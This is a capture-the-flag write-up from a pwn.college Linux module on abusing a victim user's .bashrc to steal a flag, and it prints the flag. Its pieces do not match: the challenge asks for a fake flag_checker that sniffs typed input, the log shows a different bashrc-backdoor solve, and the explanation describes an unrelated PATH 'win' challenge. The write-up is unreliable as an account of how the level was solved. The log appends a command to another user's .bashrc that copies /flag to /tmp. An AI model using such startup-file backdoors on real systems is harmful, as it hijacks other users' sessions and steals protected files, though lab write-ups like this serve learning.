# Linux Luminarium
# Module 15: Silly Sehnanigans

## Sniffing Input
In the previous level, you abused Zardus's ~/.bashrc to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?

HINT: Is Zardus getting spooked by your hijack? He's careful --- he checks for the flag_checker prompt of Type the flag. Make sure your hijack also prints this prompt (e.g., echo "Type the flag"). Other than printing that prompt, your fake flag_checker can either just a) cat Zardus's input to stdout (e.g., cat with no arguments) or b) read it into a variable and echo it out. Up to you!

HINT: Don't forget to make your fake flag_checker executable, like you learned in the Perceiving Permissions module!

### Solve
**Flag:** `pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}`

This challenge required creating a custom command named win and making it discoverable through the PATH variable. A shell script called win was created inside a custom directory and configured to print the flag using the absolute path to cat. After making the script executable, PATH was overwritten to include only the directory containing win. When /challenge/run attempted to execute win, the shell located the custom command through PATH, executed it, and revealed the flag.

```bash
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag > /tmp/flag' >> /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
zardus@shenanigans~bashrc-backdoor:~$ ***********
-bash: 2050329729: command not found
zardus@shenanigans~bashrc-backdoor:~$ exit

logout
hacker@shenanigans~bashrc-backdoor:~$ cat /tmp/flag
pwn.college{w2WF8dlH8qhVuVgR58SyKeUvWF0.0VMzEzNxwiNyUDN0EzW}
```

### New Learnings
Learned that users can create their own executable commands and expose them to the shell through the PATH variable. Reinforced that command lookup depends entirely on the directories listed in PATH, allowing custom programs to be executed by name. Also gained experience creating executable scripts, using absolute paths to avoid PATH dependency issues, and effectively extending the shell's command set.